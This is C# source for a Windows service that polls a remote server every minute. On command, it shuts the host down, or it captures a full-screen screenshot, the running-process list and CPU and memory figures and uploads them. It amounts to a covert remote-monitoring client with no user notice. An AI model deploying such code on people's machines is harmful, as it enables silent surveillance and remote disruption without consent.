using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Net;
using System.ServiceProcess;
using System.Timers;
using log4net;
using Newtonsoft.Json;
using System.Windows.Forms;
using System.IO;

namespace calisto
{
    public partial class Service1 : ServiceBase
    {
        // Constant variables
        private const int TimerInterval = 60000; // 60 seconds

        // Timer to make the HTTP request to the API
        private System.Timers.Timer timer;

        // URL of the API
        private string apiUrl = "https://myapi.com/status";

        // Logger instance
        private static readonly ILog log = LogManager.GetLogger(typeof(Service1));

        // Cache for the system status data
        private SystemStatus systemStatusCache;

        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            // Initialize the timer
            timer = new System.Timers.Timer();
            timer.Interval = TimerInterval;
            timer.Elapsed += new ElapsedEventHandler(OnTimer);
            timer.Start();
        }

        protected override void OnStop()
        {
            // Stop the timer
            timer.Stop();
        }
        private void OnTimer(object sender, ElapsedEventArgs e)
        {
            WebClient client = null;
            try
            {
                // Call the API
                string response;
                client = new WebClient();
                response = client.DownloadString(apiUrl);

                // Check the response
                if (response.Trim().ToLower() == "shutdown")
                {
                    ShutDown();
                }
                else if (response.Trim().ToLower() == "data")
                {
                    // Get the current system status
                    var systemStatus = GetSystemStatus();

                    // Serialize the system status object to a JSON string
                    var json = JsonConvert.SerializeObject(systemStatus);

                    // Send the JSON string back to the server
                    client.UploadString(apiUrl, "POST", json);
                }
            }
            catch (WebException ex)
            {
                // Log the exception message and status code
                log.Error($"An error occurred while making the HTTP request: {ex.Message} (Status code: {ex.Status})");
            }
            catch (Exception ex)
            {
                // Log the exception and inner exception messages
                log.Error($"An error occurred: {ex.Message}", ex);
            }
            finally
            {
                if (client != null)
                {
                    client.Dispose();
                }
            }
        }
        private SystemStatus GetSystemStatus()
        {
            // Check if the system status cache is still valid
            if (systemStatusCache != null && (DateTime.Now - systemStatusCache.Time).TotalMilliseconds < TimerInterval)
            {
                // Return the cached system status
                return systemStatusCache;
            }

            // Create a new SystemStatus object
            var systemStatus = new SystemStatus();

            // Get the current CPU load
            systemStatus.CpuLoad = GetCpuLoad();

            // Get the current memory usage
            systemStatus.MemoryUsage = GetMemoryUsage();

            // Get the current system time
            systemStatus.Time = DateTime.Now;

            // Get a screenshot of the current screen
            systemStatus.Screenshot = GetScreenshot();

            // Get a list of applications running on the system
            systemStatus.Applications = GetRunningApplications();

            // Update the system status cache
            systemStatusCache = systemStatus;

            return systemStatus;
        }

        private double GetCpuLoad()
        {
            // Use a PerformanceCounter to get the current CPU load
            try
            {
                using (PerformanceCounter pc = new PerformanceCounter("Processor", "% Processor Time", "_Total"))
                {
                    // Get the next value for the counter
                    pc.NextValue();

                    // Wait for 1 second
                    System.Threading.Thread.Sleep(1000);

                    // Get the next value for the counter again
                    return pc.NextValue();
                }
            }
            catch (Exception ex)
            {
                // An error occurred while getting the CPU load
                // Log the exception and return 0
                log.Error($"An error occurred while getting the CPU load: {ex.Message}", ex);
                return 0;
            }
        }

        private double GetMemoryUsage()
        {
            try
            {
                // Get the current physical memory usage
                long totalMemory = new Microsoft.VisualBasic.Devices.ComputerInfo().TotalPhysicalMemory;

                // Get the current available physical memory
                long availableMemory = new Microsoft.VisualBasic.Devices.ComputerInfo().AvailablePhysicalMemory;

                // Calculate the memory usage
                double memoryUsage = (totalMemory - availableMemory) / (double)totalMemory;

                return memoryUsage;
            }
            catch (Exception ex)
            {
                // An error occurred while getting the memory usage
                // Log the exception and return 0
                log.Error($"An error occurred while getting the memory usage: {ex.Message}", ex);
                return 0;
            }
        }

        private byte[] GetScreenshot()
        {
            try
            {
                // Create a bitmap of the current screen
                Bitmap screenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);

                // Create a graphics object from the bitmap
                Graphics graphics = Graphics.FromImage(screenshot);

                // Copy the screen to the graphics object
                graphics.CopyFromScreen(0, 0, 0, 0, screenshot.Size);

                // Save the screenshot to a temporary file
                string filePath = Path.GetTempFileName() + ".png";
                screenshot.Save(filePath, ImageFormat.Png);

                // Read the screenshot from the temporary file
                byte[] screenshotData = File.ReadAllBytes(filePath);

                // Delete the temporary file
                File.Delete(filePath);

                return screenshotData;
            }
            catch (Exception ex)
            {
                // An error occurred while getting the screenshot
                // Log the exception and return an empty array
                log.Error($"An error occurred while getting the screenshot: {ex.Message}", ex);
                return new byte[0];
            }
        }
        private List<string> GetRunningApplications()
        {
            // Get a list of all running processes
            Process[] processes = Process.GetProcesses();

            // Create a list to store the names of the running applications
            var runningApplications = new List<string>();

            // Iterate through the processes
            foreach (Process process in processes)
            {
                try
                {
                    // Get the process name
                    string processName = process.ProcessName;

                    // Check if the process name is not empty
                    if (!string.IsNullOrEmpty(processName))
                    {
                        // Add the process name to the list
                        runningApplications.Add(processName);
                    }
                }
                catch (Exception ex)
                {
                    // An error occurred while getting the process name
                    // Log the exception
                    log.Error($"An error occurred while getting the process name: {ex.Message}", ex);
                }
            }

            return runningApplications;
        }

        private void ShutDown()
        {
            // Shut down the host
            System.Diagnostics.Process.Start("shutdown.exe", "/s /t 0");
        }

        // Inner class to represent the system status
        public class SystemStatus
        {
            public double CpuLoad { get; set; }
            public double MemoryUsage { get; set; }
            public DateTime Time { get; set; }
            public byte[] Screenshot { get; set; }
            public List<string> Applications { get; set; }
        }

        // Inner class to represent an application
        private class Application
        {
            public string Name { get; set; }
            public int Id { get; set; }
            public DateTime StartTime { get; set; }
        }
        public class DataResponse
        {
            public string Message { get; set; }
        }
    }
}